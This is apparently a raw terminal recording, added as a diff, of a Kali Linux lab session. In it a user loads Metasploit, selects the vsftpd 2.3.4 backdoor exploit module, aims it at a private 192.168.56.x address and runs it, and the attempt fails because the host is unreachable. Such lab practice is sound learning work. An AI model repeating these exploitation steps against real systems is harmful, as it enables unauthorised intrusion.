@@ -1,0 +1,94 @@
+Script started on 2025-11-06 21:09:35+05:30 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="117" LINES="20"]
+zsh: corrupt history file /home/rajarshi/.zsh_history
+                                                                                                                     ]0;rajarshi@kali: ~[0m[27m[24m[J[32m┌──([1m[32m[34mrajarshi㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004hmsfconsole[10D[36mm[36ms[36mf[36mc[36mo[36mn[36ms[36mo[36ml[36me[39m[?1l>[?2004l
+Metasploit tip: You can pivot connections over sessions started with the 
+ssh_login modules
+[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../                                                  
+[0m[36m[0m[31m
+      .:okOOOkdc'           'cdkOOOko:.
+    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
+   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
+  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
+  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
+  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
+  lOOOOOOOO.         ;d;         ,OOOOOOOOl
+  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
+   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
+    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
+     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
+      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
+       .dOOo   .OOOOocccxOOOO.   xOOd.
+         ,kOl  .OOOOOOOOOOOOO. .dOk,
+           :kk;.OOOOOOOOOOOOO.cOk:
+             ;kOOOOOOOOOOOOOOOk:
+               ,xOOOOOOOOOOOx,
+                 .lOOOOOOOl.
+                    ,dOd,
+                      .[0m[0m
+
+       =[ [33mmetasploit v6.4.84-dev[0m                                ]
++ -- --=[ 2,547 exploits - 1,309 auxiliary - 1,683 payloads     ]
++ -- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Project
+
+[?1034h[4mmsf[0m [0m> sr[Kearch vsftpd
+[0m
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  auxiliary/dos/ftp/[45mvsftpd[0m_232          2011-02-03       normal     Yes    [45mVSFTPD[0m 2.3.2 Denial of Service
+   1  exploit/unix/ftp/[45mvsftpd[0m_234_backdoor  2011-07-03       [32mexcellent[0m  No     [45mVSFTPD[0m v2.3.4 Backdoor Command Execution
+
+
+Interact with a module by name or index. For example [32minfo 1[0m, [32muse 1[0m or [32muse exploit/unix/ftp/vsftpd_234_backdoor[0m
+
+[4mmsf[0m [0m> use exploiy[Kt/unix/ftp/vsftpd_3[K234_backdoor
+[0m[1m[34m[*][0m No payload configured, defaulting to cmd/unix/interact
+[4mmsf[0m exploit([1m[31munix/ftp/vsftpd_234_backdoor[0m) [0m> ser[Kt RHOSTS 192.168.56.101
+[0mRHOSTS => 192.168.56.101
+[4mmsf[0m exploit([1m[31munix/ftp/vsftpd_234_backdoor[0m) [0m> set LHOST  192.168.56.102
+[0m[1m[33m[!][0m Unknown datastore option: LHOST. Did you mean RHOST?
+LHOST => 192.168.56.102
+[4mmsf[0m exploit([1m[31munix/ftp/vsftpd_234_backdoor[0m) [0m> set :[KLPORT 4444
+[0m[1m[33m[!][0m Unknown datastore option: LPORT. Did you mean RPORT?
+LPORT => 4444
+[4mmsf[0m exploit([1m[31munix/ftp/vsftpd_234_backdoor[0m) [0m> show options
+[0m
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CHOST                     no        The local client address
+   CPORT                     no        The local client port
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported prox
+                                       ies: sapni, socks4, socks5, http, socks5h
+   RHOSTS   192.168.56.101   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/ba
+                                       sics/using-metasploit.html
+   RPORT    21               yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the [32minfo[0m, or [32minfo -d[0m command.
+
+[4mmsf[0m exploit([1m[31munix/ftp/vsftpd_234_backdoor[0m) [0m> exploit
+[0m[1m[31m[-][0m 192.168.56.101:21 - Exploit failed [unreachable]: Rex::HostUnreachable The host (192.168.56.101:21) was unreachable.
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf[0m exploit([1m[31munix/ftp/vsftpd_234_backdoor[0m) [0m> exit
+[0m                                                                                                                     ]0;rajarshi@kali: ~
+[0m[27m[24m[J[32m┌──([1m[32m[34mrajarshi㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004he[4me[24m[4me[4mx[24m[24m[36me[24m[36mx[39m[36me[36mx[36mi[39m[39m[4me[39m[4mx[39m[4mi[24m[4mi[4mt[24m[24m[36me[24m[36mx[24m[36mi[24m[36mt[39m[?1l>[?2004l
+zsh: corrupt history file /home/rajarshi/.zsh_history
+
+Script done on 2025-11-06 21:12:11+05:30 [COMMAND_EXIT_CODE="0"]
